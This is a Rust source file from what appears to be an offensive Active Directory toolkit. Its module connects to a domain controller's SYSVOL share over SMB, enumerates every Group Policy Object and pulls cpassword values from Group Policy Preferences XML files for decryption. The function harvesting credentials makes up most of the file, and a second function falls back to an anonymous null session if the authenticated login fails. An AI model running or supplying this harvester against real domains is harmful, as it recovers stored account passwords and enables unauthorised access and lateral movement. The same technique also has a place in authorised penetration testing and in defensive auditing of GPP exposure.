//! GPP (Group Policy Preferences) live SYSVOL fetcher.
//!
//! Connects to the Domain Controller's SYSVOL share over SMB,
//! enumerates all Group Policy Object directories, and extracts
//! GPP XML files containing cpassword values. Decryption is
//! delegated to `overthrone_core::crypto::gpp`.

use crate::runner::ReaperConfig;
use overthrone_core::crypto::gpp::{parse_gpp_xml, GppCredential};
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::smb::SmbSession;
use tracing::{debug, info, warn};

/// GPP XML file types that can contain cpassword attributes.
/// Each is relative to `{GPO_GUID}\{Machine|User}\Preferences\`.
const GPP_XML_FILES: &[&str] = &[
    "Groups\\Groups.xml",
    "Services\\Services.xml",
    "ScheduledTasks\\ScheduledTasks.xml",
    "DataSources\\DataSources.xml",
    "Printers\\Printers.xml",
    "Drives\\Drives.xml",
];

/// Contexts within each GPO to search (Machine and User policies).
const GPP_CONTEXTS: &[&str] = &["Machine", "User"];

/// Result of a full GPP SYSVOL scan.
#[derive(Debug, Clone)]
pub struct GppScanResult {
    pub credentials: Vec<GppCredential>,
    pub gpos_scanned: usize,
    pub xml_files_found: usize,
    pub errors: Vec<String>,
}

/// Enumerate GPP passwords from live SYSVOL via SMB.
///
/// Connects to `\\<dc_ip>\SYSVOL`, lists all GPO GUID directories,
/// then reads every known GPP XML file path and decrypts any
/// cpassword values found.
pub async fn enumerate_gpp_passwords(config: &ReaperConfig) -> Result<GppScanResult> {
    info!(
        "[gpp] Connecting to \\\\{}\\SYSVOL as {}\\{}",
        config.dc_ip, config.domain, config.username
    );

    let smb = SmbSession::connect(
        &config.dc_ip,
        &config.domain,
        &config.username,
        config.password.as_deref().unwrap_or(""),
    )
    .await?;

    // SYSVOL share path: <domain>\Policies
    let policies_path = format!("{}\\Policies", config.domain);

    // List all GPO directories (each is a GUID like {31B2F340-...})
    let gpo_dirs = match smb.list_directory("SYSVOL", &policies_path).await {
        Ok(entries) => entries,
        Err(e) => {
            // Try lowercase domain name as fallback
            let lower_path = format!("{}\\Policies", config.domain.to_lowercase());
            smb.list_directory("SYSVOL", &lower_path).await.map_err(|e2| {
                OverthroneError::Smb(format!(
                    "Cannot list SYSVOL\\Policies (tried both cases): {e} / {e2}"
                ))
            })?
        }
    };

    let gpo_entries: Vec<_> = gpo_dirs
        .iter()
        .filter(|e| e.is_directory && e.name.starts_with('{') && e.name.ends_with('}'))
        .collect();

    info!(
        "[gpp] Found {} GPO directories in SYSVOL",
        gpo_entries.len()
    );

    let mut result = GppScanResult {
        credentials: Vec::new(),
        gpos_scanned: gpo_entries.len(),
        xml_files_found: 0,
        errors: Vec::new(),
    };

    for gpo in &gpo_entries {
        for context in GPP_CONTEXTS {
            for xml_file in GPP_XML_FILES {
                let full_path = format!(
                    "{}\\{}\\{}\\Preferences\\{}",
                    policies_path, gpo.name, context, xml_file
                );

                match smb.read_file("SYSVOL", &full_path).await {
                    Ok(raw_bytes) => {
                        result.xml_files_found += 1;

                        // Strip UTF-8 BOM if present
                        let content = strip_bom(&raw_bytes);
                        let xml_str = String::from_utf8_lossy(content);

                        let source = format!(
                            "\\\\{}\\SYSVOL\\{}  [GPO: {}]",
                            config.dc_ip, full_path, gpo.name
                        );

                        let creds = parse_gpp_xml(&xml_str, &source);
                        if !creds.is_empty() {
                            info!(
                                "[gpp]  Found {} credential(s) in {}\\{}\\{}",
                                creds.len(),
                                gpo.name,
                                context,
                                xml_file
                            );
                            result.credentials.extend(creds);
                        } else {
                            debug!(
                                "[gpp]  No cpassword in {}\\{}\\{} (file exists but empty/cleared)",
                                gpo.name, context, xml_file
                            );
                        }
                    }
                    Err(_) => {
                        // File doesn't exist in this GPO — completely normal, skip silently
                        continue;
                    }
                }
            }
        }
    }

    // Summary
    if result.credentials.is_empty() {
        info!(
            "[gpp] Scan complete: {} GPOs checked, {} XML files found, no credentials recovered",
            result.gpos_scanned, result.xml_files_found
        );
    } else {
        info!(
            "[gpp] Scan complete: {} credential(s) recovered from {} XML files across {} GPOs",
            result.credentials.len(),
            result.xml_files_found,
            result.gpos_scanned
        );
        for cred in &result.credentials {
            info!(
                "[gpp]  → {}:{} (changed: {}, source: {})",
                cred.username,
                mask_password(&cred.password),
                cred.changed,
                cred.source_file
            );
        }
    }

    Ok(result)
}

/// Enumerate GPP passwords with null/anonymous session fallback.
///
/// Some environments leave SYSVOL readable to anonymous users.
/// This tries the provided creds first, then falls back to a null session.
pub async fn enumerate_gpp_passwords_with_fallback(
    config: &ReaperConfig,
) -> Result<GppScanResult> {
    // First attempt: authenticated
    match enumerate_gpp_passwords(config).await {
        Ok(result) => return Ok(result),
        Err(e) => {
            warn!("[gpp] Authenticated SYSVOL access failed: {e}");
            info!("[gpp] Attempting null session fallback...");
        }
    }

    // Second attempt: null session (empty user/pass)
    let null_config = ReaperConfig {
        dc_ip: config.dc_ip.clone(),
        domain: config.domain.clone(),
        username: String::new(),
        password: Some(String::new()),
        ..config.clone()
    };

    enumerate_gpp_passwords(&null_config).await.map_err(|e| {
        OverthroneError::Smb(format!(
            "GPP SYSVOL access failed (both authenticated and null session): {e}"
        ))
    })
}

/// Strip UTF-8 BOM (0xEF 0xBB 0xBF) from the start of a byte slice.
fn strip_bom(data: &[u8]) -> &[u8] {
    if data.len() >= 3 && data[0] == 0xEF && data[1] == 0xBB && data[2] == 0xBF {
        &data[3..]
    } else {
        data
    }
}

/// Mask a password for logging (show first 2 chars + asterisks).
fn mask_password(password: &str) -> String {
    if password.len() <= 2 {
        "***".to_string()
    } else {
        format!("{}***", &password[..2])
    }
}

// ═══════════════════════════════════════════════════════════
//  Tests
// ═══════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_strip_bom() {
        let with_bom = b"\xEF\xBB\xBF<?xml version=\"1.0\"?>";
        let without = b"<?xml version=\"1.0\"?>";
        assert_eq!(strip_bom(with_bom), &with_bom[3..]);
        assert_eq!(strip_bom(without), &without[..]);
    }

    #[test]
    fn test_mask_password() {
        assert_eq!(mask_password("SuperSecret123"), "Su***");
        assert_eq!(mask_password("ab"), "***");
        assert_eq!(mask_password(""), "***");
    }

    #[test]
    fn test_gpp_xml_files_coverage() {
        // Verify we cover all known GPP XML locations
        assert_eq!(GPP_XML_FILES.len(), 6);
        assert!(GPP_XML_FILES.iter().all(|f| f.ends_with(".xml")));
    }
}
